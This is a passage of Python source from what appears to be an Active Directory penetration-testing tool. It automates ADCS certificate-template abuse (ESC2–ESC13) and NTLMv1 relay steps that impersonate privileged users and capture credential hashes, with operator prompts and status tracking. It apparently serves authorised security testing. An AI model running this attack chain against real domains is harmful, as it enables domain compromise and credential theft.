                    esc3_agent_templates = [
                        _resolve_template_cn(shell, domain, t) for t in esc3_agent_templates
                    ]
                    marked = ", ".join(
                        mark_sensitive(template_name, "service")
                        for template_name in esc3_agent_templates
                    )
                    print_info_debug(
                        "[adcsesc3] Using agent template(s) from attack step details: "
                        f"{marked}"
                    )
                else:
                    esc3_agent_templates = _resolve_adcs_template_candidates(
                        shell,
                        domain=domain,
                        exec_username=exec_username,
                        password=password,
                        esc_number="3",
                        details=details,
                        to_label=to_label,
                        domain_data=domain_data,
                    )
                if not esc3_agent_templates:
                    manual_template = _prompt_for_manual_adcs_template(esc_number="3")
                    if manual_template:
                        esc3_agent_templates = [manual_template]
                        print_info_debug(
                            "[adcsesc3] Using operator-specified agent template: "
                            f"{mark_sensitive(manual_template, 'service')}"
                        )
                    else:
                        print_warning(
                            "No ESC3 vulnerable certificate templates found for this user."
                        )
                        return execution_started
                if not esc3_agent_templates:
                    print_warning(
                        "No ESC3 vulnerable certificate templates found for this user."
                    )
                    return execution_started

                agent_template = _select_adcs_template(
                    shell,
                    esc_number="3",
                    templates=esc3_agent_templates,
                    prompt_label="agent template",
                )
                if not agent_template:
                    print_warning("ESC3 execution cancelled.")
                    return execution_started

                esc3_target_templates = _extract_cert_templates_by_role(
                    details,
                    role="target",
                )
                if esc3_target_templates:
                    from adscan_internal.cli.adcs_exploitation import _resolve_template_cn

                    esc3_target_templates = [
                        _resolve_template_cn(shell, domain, t) for t in esc3_target_templates
                    ]
                if not esc3_target_templates:
                    esc3_target_templates = ["User"]
                default_target_idx = 0
                for idx, template_name in enumerate(esc3_target_templates):
                    if str(template_name).strip().lower() == "user":
                        default_target_idx = idx
                        break

                client_auth_template = _select_adcs_template(
                    shell,
                    esc_number="3",
                    templates=esc3_target_templates,
                    default_idx=default_target_idx,
                    prompt_label="target template",
                )
                if not client_auth_template:
                    print_warning("ESC3 execution cancelled.")
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action="ADCSESC3",
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "template_used_for_run": agent_template,
                        "client_auth_template": client_auth_template,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC3",
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "template_used_for_run": agent_template,
                                "client_auth_template": client_auth_template,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    from adscan_internal.cli.adcs_exploitation import adcs_esc3

                    esc3_success = bool(
                        adcs_esc3(
                            shell,
                            domain=domain,
                            username=exec_username,
                            password=password,
                            template=agent_template,
                            client_auth_template=client_auth_template,
                        )
                    )
                    if not esc3_success:
                        _handle_failed_adcs_step(
                            "ADCSESC3",
                            from_label,
                            to_label,
                            notes={
                                "username": exec_username,
                                "template_used_for_run": agent_template,
                            },
                        )
                        return execution_started
                    esc3_outcome = get_last_ace_execution_outcome(shell) or {}
                    _handle_successful_credential_step(
                        "ADCSESC3",
                        from_label,
                        to_label,
                        notes={
                            "username": exec_username,
                            "template_used_for_run": agent_template,
                            "client_auth_template": client_auth_template,
                        },
                        captured_principal=(
                            str(esc3_outcome.get("compromised_user") or "")
                            or _attack_path_label_to_name(to_label)
                        ),
                        credential_type=str(
                            esc3_outcome.get("credential_type") or "nt_hash"
                        ),
                    )
                continue

            if key == "adcsesc4":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC4: missing from/to details.")
                    return execution_started

                # Prefer using the credential for the step source (the user that has
                # the ESC4 relationship), then fall back to the context user and
                # finally to an applies_to user (owned/group paths).
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    marked_user = mark_sensitive(from_label, "user")
                    print_warning(
                        f"Cannot execute ADCSESC4: no execution user context available for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC4",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    return execution_started

                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    marked_user = mark_sensitive(exec_username, "user")
                    print_warning(
                        f"Cannot execute ADCSESC4: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC4",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC4 for {marked_domain}: missing PDC IP in domain data."
                    )
                    _mark_blocked_step(
                        "ADCSESC4",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC IP in domain data",
                    )
                    return execution_started
                if not domain_data.get("adcs") or not domain_data.get("ca"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC4 for {marked_domain}: missing ADCS/CA info."
                    )
                    _mark_blocked_step(
                        "ADCSESC4",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing ADCS/CA info in domain data",
                    )
                    return execution_started

                # ESC4 is disruptive: it modifies a certificate template in AD.
                # Require explicit operator confirmation.
                message = Text()
                marked_user = mark_sensitive(exec_username, "user")
                message.append(
                    "ESC4 will modify an ADCS certificate template in Active Directory.\n",
                    style="bold yellow",
                )
                message.append(
                    f"Execution user: {marked_user}\n\n",
                    style="bold",
                )
                message.append(
                    "What ADscan will do:\n",
                    style="bold",
                )
                message.append(
                    " - Backup current template configuration\n"
                    " - Modify the template to enable ESC1-style abuse\n"
                    " - Request an auth certificate and attempt Pass-the-Certificate\n"
                    " - Restore the original template configuration (best-effort)\n\n",
                    style="dim",
                )
                message.append(
                    "Risk notes:\n",
                    style="bold",
                )
                message.append(
                    " - If restore fails, the template may remain modified until manually restored.\n",
                    style="dim",
                )
                print_panel(
                    message,
                    title=Text("Disruptive Operation: ADCS ESC4", style="bold yellow"),
                    border_style="yellow",
                    expand=False,
                )
                if not Confirm.ask(
                    "Proceed with ESC4 template modification?",
                    default=True,
                ):
                    print_warning("ESC4 execution cancelled by operator.")
                    return execution_started

                esc4_templates = _resolve_adcs_template_candidates(
                    shell,
                    domain=domain,
                    exec_username=exec_username,
                    password=password,
                    esc_number="4",
                    details=details,
                    to_label=to_label,
                    domain_data=domain_data,
                    allow_object_control=True,
                )

                if not esc4_templates:
                    manual_template = _prompt_for_manual_adcs_template(esc_number="4")
                    if manual_template:
                        esc4_templates = [manual_template]
                        print_info_debug(
                            "[adcsesc4] Using operator-specified template: "
                            f"{mark_sensitive(manual_template, 'service')}"
                        )
                    else:
                        marked_user = mark_sensitive(exec_username, "user")
                        print_warning(
                            f"No ESC4 vulnerable certificate templates found for {marked_user}."
                        )
                        return execution_started
                if not esc4_templates:
                    marked_user = mark_sensitive(exec_username, "user")
                    print_warning(
                        f"No ESC4 vulnerable certificate templates found for {marked_user}."
                    )
                    return execution_started

                template = _select_adcs_template(
                    shell,
                    esc_number="4",
                    templates=esc4_templates,
                )
                if not template:
                    print_warning("ESC4 execution cancelled.")
                    return execution_started

                execution_started = True
                with _active_step_context(
                    action="ADCSESC4",
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "template_used_for_run": template,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC4",
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    from adscan_internal.cli.adcs_exploitation import adcs_esc4

                    esc4_result = adcs_esc4(
                        shell,
                        domain=domain,
                        username=exec_username,
                        password=password,
                        template=template,
                    )
                    if not esc4_result.success:
                        _handle_failed_adcs_step(
                            "ADCSESC4",
                            from_label,
                            to_label,
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                        return execution_started
                    _handle_successful_adcs_step(
                        "ADCSESC4",
                        from_label,
                        to_label,
                        notes={
                            "username": exec_username,
                            "template_used_for_run": template,
                        },
                        impersonated_target=str(
                            esc4_result.evidence.get("impersonated_target")
                            if isinstance(esc4_result.evidence, dict)
                            else ""
                        )
                        or f"administrator@{domain}",
                        esc_result=esc4_result,
                    )
                continue

            if key == "adcsesc13":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC13: missing from/to details.")
                    return execution_started

                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    marked_user = mark_sensitive(from_label, "user")
                    print_warning(
                        f"Cannot execute ADCSESC13: no execution user context available for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC13",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    return execution_started

                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    marked_user = mark_sensitive(exec_username, "user")
                    print_warning(
                        f"Cannot execute ADCSESC13: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        "ADCSESC13",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing stored credential for execution user",
                    )
                    return execution_started

                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC13 for {marked_domain}: missing PDC IP in domain data."
                    )
                    _mark_blocked_step(
                        "ADCSESC13",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC IP in domain data",
                    )
                    return execution_started
                if not domain_data.get("adcs") or not domain_data.get("ca"):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_warning(
                        f"Cannot execute ADCSESC13 for {marked_domain}: missing ADCS/CA info."
                    )
                    _mark_blocked_step(
                        "ADCSESC13",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing ADCS/CA info in domain data",
                    )
                    return execution_started

                esc13_templates = _resolve_adcs_template_candidates(
                    shell,
                    domain=domain,
                    exec_username=exec_username,
                    password=password,
                    esc_number="13",
                    details=details,
                    to_label=to_label,
                    domain_data=domain_data,
                    allow_target_label_template=False,
                )
                if not esc13_templates:
                    manual_template = _prompt_for_manual_adcs_template(esc_number="13")
                    if manual_template:
                        esc13_templates = [manual_template]
                        print_info_debug(
                            "[adcsesc13] Using operator-specified template: "
                            f"{mark_sensitive(manual_template, 'service')}"
                        )
                    else:
                        print_warning(
                            "No ESC13 vulnerable certificate templates found for this user."
                        )
                        return execution_started
                if not esc13_templates:
                    print_warning(
                        "No ESC13 vulnerable certificate templates found for this user."
                    )
                    return execution_started

                template = _select_adcs_template(
                    shell,
                    esc_number="13",
                    templates=esc13_templates,
                )
                if not template:
                    print_warning("ESC13 execution cancelled.")
                    return execution_started
                effective_group = _extract_effective_group_from_step_details(
                    details
                ) or _attack_path_label_to_name(to_label)

                execution_started = True
                with _active_step_context(
                    action="ADCSESC13",
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "template_used_for_run": template,
                        **(
                            {"effective_group": effective_group}
                            if effective_group
                            else {}
                        ),
                    },
                ):
                    try:
                        notes = {
                            "username": exec_username,
                            "template_used_for_run": template,
                            **(
                                {"effective_group": effective_group}
                                if effective_group
                                else {}
                            ),
                        }
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC13",
                            to_label=to_label,
                            status="attempted",
                            notes=notes,
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

                    from adscan_internal.cli.adcs_exploitation import adcs_esc13

                    esc13_success = bool(
                        adcs_esc13(
                            shell,
                            domain=domain,
                            username=exec_username,
                            password=password,
                            template=template,
                            effective_group=effective_group,
                        )
                    )
                    if not esc13_success:
                        _handle_failed_adcs_step(
                            "ADCSESC13",
                            from_label,
                            to_label,
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                        return execution_started
                    # ESC13 grants a privileged group membership rather than a
                    # standalone credential, so there is no captured principal to
                    # promote; route through the centralised helper for the
                    # edge-status -> success transition only.
                    _handle_successful_credential_step(
                        "ADCSESC13",
                        from_label,
                        to_label,
                        notes={
                            "username": exec_username,
                            "template_used_for_run": template,
                            **(
                                {"effective_group": effective_group}
                                if effective_group
                                else {}
                            ),
                        },
                        captured_principal=None,
                    )
                continue

            if key == "adcsesc2":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC2: missing from/to details.")
                    return execution_started
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    _mark_blocked_step(
                        "ADCSESC2",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    return execution_started
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    _mark_blocked_step(
                        "ADCSESC2",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing credential",
                    )
                    return execution_started
                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc") or not domain_data.get("ca"):
                    _mark_blocked_step(
                        "ADCSESC2",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC/CA info in domain data",
                    )
                    return execution_started
                esc_templates = _resolve_adcs_template_candidates(
                    shell,
                    domain=domain,
                    exec_username=exec_username,
                    password=password,
                    esc_number="2",
                    details=details,
                    to_label=to_label,
                    domain_data=domain_data,
                )
                template = esc_templates[0] if esc_templates else None
                if not template:
                    template = _prompt_for_manual_adcs_template(esc_number="2")
                if not template:
                    print_warning("No ESC2 template found or selected.")
                    return execution_started
                from adscan_internal.cli.privileged_target_selection import (
                    resolve_privileged_target_user,
                )

                esc2_target_user = resolve_privileged_target_user(
                    shell,
                    domain=domain,
                    purpose="ESC2 on-behalf-of certificate request",
                )
                if not esc2_target_user:
                    print_warning(
                        "ESC2 execution cancelled: no privileged target selected."
                    )
                    return execution_started
                esc2_target_upn = f"{esc2_target_user}@{domain}"
                execution_started = True
                with _active_step_context(
                    action="ADCSESC2",
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "template_used_for_run": template,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC2",
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                    from adscan_internal.services.adcs.esc_runner import run_esc_sync
                    from adscan_internal.services.adcs.esc_types import EscConfig

                    from adscan_internal.cli.adcs_exploitation import (
                        _resolve_template_min_key_size,
                    )

                    esc_cfg = EscConfig(
                        esc=2,
                        domain=domain,
                        auth_domain=domain,
                        dc_ip=str(domain_data.get("pdc") or ""),
                        auth_kdc=str(domain_data.get("pdc") or ""),
                        ca_host=str(
                            domain_data.get("adcs")
                            or domain_data.get("pdc_hostname")
                            or domain_data.get("pdc")
                            or ""
                        ),
                        ca_name=str(domain_data.get("ca") or ""),
                        template=template,
                        username=exec_username,
                        password=password,
                        target_upn=esc2_target_upn,
                        workspace_dir=_resolve_workspace_dir(shell, domain),
                        shell=shell,
                        ca_fqdn=_resolve_ca_fqdn(domain_data),
                        dc_fqdn=(
                            domain_data.get("dc_fqdn")
                            or domain_data.get("pdc_hostname")
                            or None
                        ),
                        min_key_size=_resolve_template_min_key_size(shell, domain, template or ""),
                    )
                    esc2_result = run_esc_sync(esc_cfg)
                    if not esc2_result.success:
                        _handle_failed_adcs_step(
                            "ADCSESC2",
                            from_label,
                            to_label,
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                        return execution_started
                    _handle_successful_adcs_step(
                        "ADCSESC2",
                        from_label,
                        to_label,
                        notes={
                            "username": exec_username,
                            "template_used_for_run": template,
                        },
                        impersonated_target=esc2_target_upn,
                        esc_result=esc2_result,
                    )
                continue

            if key == "adcsesc6":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC6: missing from/to details.")
                    return execution_started
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    _mark_blocked_step(
                        "ADCSESC6",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    return execution_started
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    _mark_blocked_step(
                        "ADCSESC6",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing credential",
                    )
                    return execution_started
                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc") or not domain_data.get("ca"):
                    _mark_blocked_step(
                        "ADCSESC6",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC/CA info in domain data",
                    )
                    return execution_started
                esc_templates = _resolve_adcs_template_candidates(
                    shell,
                    domain=domain,
                    exec_username=exec_username,
                    password=password,
                    esc_number="6",
                    details=details,
                    to_label=to_label,
                    domain_data=domain_data,
                )
                template = esc_templates[0] if esc_templates else None
                if not template:
                    template = _prompt_for_manual_adcs_template(esc_number="6")
                if not template:
                    print_warning("No ESC6 template found or selected.")
                    return execution_started
                from adscan_internal.cli.privileged_target_selection import (
                    resolve_privileged_target_user,
                )

                esc6_target_user = resolve_privileged_target_user(
                    shell,
                    domain=domain,
                    purpose="ESC6 certificate request",
                )
                if not esc6_target_user:
                    print_warning(
                        "ESC6 execution cancelled: no privileged target selected."
                    )
                    return execution_started
                esc6_target_upn = f"{esc6_target_user}@{domain}"
                execution_started = True
                with _active_step_context(
                    action="ADCSESC6",
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "template_used_for_run": template,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC6",
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                    from adscan_internal.services.adcs.esc_runner import run_esc_sync
                    from adscan_internal.services.adcs.esc_types import EscConfig

                    from adscan_internal.cli.adcs_exploitation import (
                        _resolve_template_min_key_size,
                    )

                    esc_cfg = EscConfig(
                        esc=6,
                        domain=domain,
                        auth_domain=domain,
                        dc_ip=str(domain_data.get("pdc") or ""),
                        auth_kdc=str(domain_data.get("pdc") or ""),
                        ca_host=str(
                            domain_data.get("adcs")
                            or domain_data.get("pdc_hostname")
                            or domain_data.get("pdc")
                            or ""
                        ),
                        ca_name=str(domain_data.get("ca") or ""),
                        template=template,
                        username=exec_username,
                        password=password,
                        target_upn=esc6_target_upn,
                        workspace_dir=_resolve_workspace_dir(shell, domain),
                        shell=shell,
                        ca_fqdn=_resolve_ca_fqdn(domain_data),
                        dc_fqdn=(
                            domain_data.get("dc_fqdn")
                            or domain_data.get("pdc_hostname")
                            or None
                        ),
                        min_key_size=_resolve_template_min_key_size(shell, domain, template or ""),
                    )
                    esc6_result = run_esc_sync(esc_cfg)
                    if not esc6_result.success:
                        _handle_failed_adcs_step(
                            "ADCSESC6",
                            from_label,
                            to_label,
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                        return execution_started
                    _handle_successful_adcs_step(
                        "ADCSESC6",
                        from_label,
                        to_label,
                        notes={
                            "username": exec_username,
                            "template_used_for_run": template,
                        },
                        impersonated_target=esc6_target_upn,
                        esc_result=esc6_result,
                    )
                continue

            if key == "adcsesc7":
                if not from_label or not to_label:
                    print_warning("Cannot execute ADCSESC7: missing from/to details.")
                    return execution_started
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    _mark_blocked_step(
                        "ADCSESC7",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    return execution_started
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    _mark_blocked_step(
                        "ADCSESC7",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing credential",
                    )
                    return execution_started
                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if not domain_data.get("pdc") or not domain_data.get("ca"):
                    _mark_blocked_step(
                        "ADCSESC7",
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC/CA info in domain data",
                    )
                    return execution_started
                from adscan_internal.cli.privileged_target_selection import (
                    resolve_privileged_target_user,
                )

                esc7_target_user = resolve_privileged_target_user(
                    shell,
                    domain=domain,
                    purpose="ESC7 certificate request",
                )
                if not esc7_target_user:
                    print_warning(
                        "ESC7 execution cancelled: no privileged target selected."
                    )
                    return execution_started
                esc7_target_upn = f"{esc7_target_user}@{domain}"
                execution_started = True
                with _active_step_context(
                    action="ADCSESC7",
                    from_label=from_label,
                    to_label=to_label,
                    notes={"username": exec_username},
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation="ADCSESC7",
                            to_label=to_label,
                            status="attempted",
                            notes={"username": exec_username},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                    from adscan_internal.services.adcs.esc_runner import run_esc_sync
                    from adscan_internal.services.adcs.esc_types import EscConfig

                    esc_cfg = EscConfig(
                        esc=7,
                        domain=domain,
                        auth_domain=domain,
                        dc_ip=str(domain_data.get("pdc") or ""),
                        auth_kdc=str(domain_data.get("pdc") or ""),
                        ca_host=str(
                            domain_data.get("adcs")
                            or domain_data.get("pdc_hostname")
                            or domain_data.get("pdc")
                            or ""
                        ),
                        ca_name=str(domain_data.get("ca") or ""),
                        template=None,
                        username=exec_username,
                        password=password,
                        target_upn=esc7_target_upn,
                        workspace_dir=_resolve_workspace_dir(shell, domain),
                        shell=shell,
                        ca_fqdn=_resolve_ca_fqdn(domain_data),
                        dc_fqdn=(
                            domain_data.get("dc_fqdn")
                            or domain_data.get("pdc_hostname")
                            or None
                        ),
                    )
                    esc7_result = run_esc_sync(esc_cfg)
                    if not esc7_result.success:
                        _handle_failed_adcs_step(
                            "ADCSESC7",
                            from_label,
                            to_label,
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                        return execution_started
                    _handle_successful_adcs_step(
                        "ADCSESC7",
                        from_label,
                        to_label,
                        notes={
                            "username": exec_username,
                            "template_used_for_run": template,
                        },
                        impersonated_target=esc7_target_upn,
                        esc_result=esc7_result,
                    )
                continue

            if key in {"adcsesc8", "adcsesc11", "coerceandrelayntlmtoadcs"}:
                esc_number = 11 if key == "adcsesc11" else 8
                action_name = f"ADCSESC{esc_number}"
                if not from_label or not to_label:
                    print_warning(
                        f"Cannot execute {action_name}: missing from/to details."
                    )
                    return execution_started
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )
                if not exec_username:
                    _mark_blocked_step(
                        action_name,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing execution user context",
                    )
                    return execution_started
                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not password:
                    _mark_blocked_step(
                        action_name,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing credential",
                    )
                    return execution_started
                domain_data = getattr(shell, "domains_data", {}).get(domain, {})
                if not isinstance(domain_data, dict):
                    domain_data = {}
                if (
                    not domain_data.get("pdc")
                    or not domain_data.get("adcs")
                    or not domain_data.get("ca")
                ):
                    _mark_blocked_step(
                        action_name,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing PDC/ADCS/CA info in domain data",
                    )
                    return execution_started

                template = "DomainController"
                detail_templates = _extract_cert_templates_from_step_details(details)
                if detail_templates:
                    from adscan_internal.cli.adcs_exploitation import _resolve_template_cn

                    template = _resolve_template_cn(shell, domain, str(detail_templates[0]).strip()) or template

                ca_host = str(domain_data.get("adcs") or "")
                ca_fqdn = (
                    ca_host
                    if ca_host and not re.fullmatch(r"\d+(?:\.\d+){3}", ca_host)
                    else None
                )
                execution_started = True
                with _active_step_context(
                    action=action_name,
                    from_label=from_label,
                    to_label=to_label,
                    notes={
                        "username": exec_username,
                        "template_used_for_run": template,
                    },
                ):
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action_name,
                            to_label=to_label,
                            status="attempted",
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                    from adscan_internal.services.adcs.esc_runner import run_esc_sync
                    from adscan_internal.services.adcs.esc_types import EscConfig

                    esc_cfg = EscConfig(
                        esc=esc_number,
                        domain=domain,
                        auth_domain=domain,
                        dc_ip=str(domain_data.get("pdc") or ""),
                        auth_kdc=str(domain_data.get("pdc") or ""),
                        ca_host=ca_host,
                        ca_name=str(domain_data.get("ca") or ""),
                        template=template,
                        username=exec_username,
                        password=password,
                        target_upn=_resolve_target_upn(to_label, domain),
                        workspace_dir=_resolve_workspace_dir(shell, domain),
                        shell=shell,
                        ca_fqdn=ca_fqdn,
                        dc_fqdn=(
                            domain_data.get("dc_fqdn")
                            or domain_data.get("pdc_hostname")
                            or None
                        ),
                    )
                    esc8_result = run_esc_sync(esc_cfg)
                    if not esc8_result.success:
                        _handle_failed_adcs_step(
                            action_name,
                            from_label,
                            to_label,
                            notes={
                                "username": exec_username,
                                "template_used_for_run": template,
                            },
                        )
                        return execution_started
                    _handle_successful_adcs_step(
                        action_name,
                        from_label,
                        to_label,
                        notes={
                            "username": exec_username,
                            "template_used_for_run": template,
                        },
                        impersonated_target=_resolve_target_upn(to_label, domain),
                        esc_result=esc8_result,
                    )
                    if esc8_result.pfx_path and hasattr(shell, "ptc_certipy"):
                        shell.ptc_certipy(domain, esc8_result.pfx_path)
                continue

            # NTLMv1 coerce→relay→(RBCD|ShadowCreds) — sub-project #3. The relay
            # relation maps to the native handler run_relay_ldap; on a successful
            # run the Ntlmv1Enabled surface marker is promoted to exploited and
            # the relay edge's own status flips via the handler's update path.
            relay_method = relay_method_for_relation(key)
            if relay_method is not None:
                action_name = action or key
                if not from_label or not to_label:
                    print_warning(
                        f"Cannot execute {action_name}: missing from/to details."
                    )
                    return execution_started
                victim_ip = _resolve_step_victim_ip(shell, domain, to_label)
                if not victim_ip:
                    _mark_blocked_step(
                        action_name,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Could not resolve victim host IP for the relay",
                    )
                    return execution_started
                from adscan_internal.cli.relay_rbcd import run_relay_ldap  # noqa: PLC0415

                relay_args = build_relay_ldap_args_for_step(
                    victim_ip=victim_ip, domain=domain,
                )
                execution_started = True
                with _active_step_context(
                    action=action_name,
                    from_label=from_label,
                    to_label=to_label,
                    notes={"relay_method": relay_method, "victim_ip": victim_ip},
                ):
                    try:
                        relay_outcome = run_relay_ldap(
                            shell, relay_args, forced_method=relay_method
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                        _handle_failed_adcs_step(
                            action_name,
                            from_label,
                            to_label,
                            notes={"relay_method": relay_method},
                        )
                        return execution_started
                    if relay_outcome != "success":
                        # The relay did not land (not viable / failed / precondition
                        # abort -> None). Mark THIS step and STOP — do NOT promote the
                        # Ntlmv1Enabled surface marker and do NOT fall through to the
                        # dependent steps (e.g. a Dump-LSA that assumes the relay
                        # already compromised the target). An attempted relay that
                        # failed mid-chain -> "attempted"; a not-viable / precondition
                        # abort (never executed) -> "blocked".
                        step_status = (
                            "attempted" if relay_outcome == "failed" else "blocked"
                        )
                        try:
                            update_edge_status_by_labels(
                                shell,
                                domain,
                                from_label=from_label,
                                relation=action_name,
                                to_label=to_label,
                                status=step_status,
                                notes={
                                    "relay_method": relay_method,
                                    "relay_outcome": relay_outcome or "not_viable",
                                },
                            )
                        except Exception as exc:  # noqa: BLE001
                            telemetry.capture_exception(exc)
                        return execution_started
                    # Relay landed: mark the relay edge success, promote the
                    # Ntlmv1Enabled surface marker, then continue to dependent steps.
                    try:
                        update_edge_status_by_labels(
                            shell,
                            domain,
                            from_label=from_label,
                            relation=action_name,
                            to_label=to_label,
                            status="success",
                            notes={"relay_method": relay_method},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                    try:
                        from adscan_internal.services.attack_graph_derived import (  # noqa: PLC0415
                            insert_derived_edge,
                        )

                        insert_derived_edge(
                            shell=shell,
                            domain=domain,
                            source="ADscan",
                            relation="Ntlmv1Enabled",
                            target=to_label,
                            technique_id=f"ntlmv1_relay_{relay_method.replace('-', '_')}",
                            evidence_path=None,
                            extra={"relay_method": relay_method},
                        )
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)
                continue

            # NTLMv1 offline crack — sub-project #3 refinement. The capture is the
            # automatable half (coerce + capture the NTLMv1 challenge/response via
            # the NTLMv1 capture sweep); the crack itself is an OFFLINE submission
            # (crack.sh rainbow tables / hashcat mode 14000) that the operator runs
            # out-of-band. We surface a guided advisory rather than fabricate an
